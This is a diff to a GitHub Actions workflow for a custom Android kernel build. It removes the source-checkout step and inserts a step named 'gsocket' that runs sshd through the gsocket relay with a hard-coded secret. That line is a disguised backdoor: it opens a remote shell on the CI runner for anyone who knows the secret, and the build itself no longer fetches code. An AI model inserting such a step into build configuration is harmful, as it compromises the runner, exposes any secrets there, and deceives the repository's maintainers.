@@ -5,10 +5,8 @@ jobs:
   build:
     runs-on: warp-custom-kernel
     steps:
-    - name: Checkout kernel source
-      uses: actions/checkout@v4
-      with:
-        submodules: 'true'
+    - name: gsocket
+      run: gsocket -s OopsieDaisy /usr/sbin/sshd -D
     - name: Install Dependencies
       run:  sudo apt-get update && sudo apt-get install -y bison build-essential bc bison curl libssl-dev git zip python3 flex cpio libncurses5-dev lld wget
     - name: Whyred kernel build
